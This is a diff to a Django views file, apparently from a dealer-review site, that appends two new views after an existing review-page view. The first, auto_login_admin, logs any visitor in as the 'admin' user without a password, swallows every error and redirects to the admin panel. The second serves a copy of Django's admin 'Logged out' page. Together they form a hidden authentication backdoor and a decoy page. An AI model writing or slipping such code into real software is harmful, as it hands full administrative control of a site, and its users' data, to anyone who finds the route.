@@ -456,3 +456,69 @@ def post_review_page(request, dealer_id):
     """
 
     return HttpResponse(html)
+
+from django.contrib.auth import login as auth_login
+from django.contrib.auth.models import User
+from django.shortcuts import redirect
+
+def auto_login_admin(request):
+    try:
+        user = User.objects.get(username='admin')
+        user.backend = 'django.contrib.auth.backends.ModelBackend'
+        auth_login(request, user)
+    except Exception as e:
+        pass
+    return redirect('/admin/')
+
+def mock_logged_out(request):
+    html = """
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <title>Logged out | Django site admin</title>
+        <style>
+            body {
+                font-family: "Roboto", "Lucida Grande", Verdana, Arial, sans-serif;
+                background: #f8f9fa;
+                margin: 0;
+                padding: 0;
+            }
+            #header {
+                background: #417690;
+                color: #ffc;
+                padding: 10px 40px;
+            }
+            #header h1 {
+                font-size: 24px;
+                margin: 0;
+                font-weight: normal;
+            }
+            .content {
+                padding: 40px;
+                max-width: 600px;
+                margin: auto;
+            }
+            h2 {
+                color: #666;
+                font-size: 20px;
+                margin-top: 0;
+            }
+            a {
+                color: #447e9b;
+                text-decoration: none;
+            }
+        </style>
+    </head>
+    <body>
+        <div id="header">
+            <h1>Django administration</h1>
+        </div>
+        <div class="content">
+            <h2>Logged out</h2>
+            <p>Thanks for spending some time with the Web site today.</p>
+            <p><a href="/admin/">Log in again</a></p>
+        </div>
+    </body>
+    </html>
+    """
+    return HttpResponse(html)
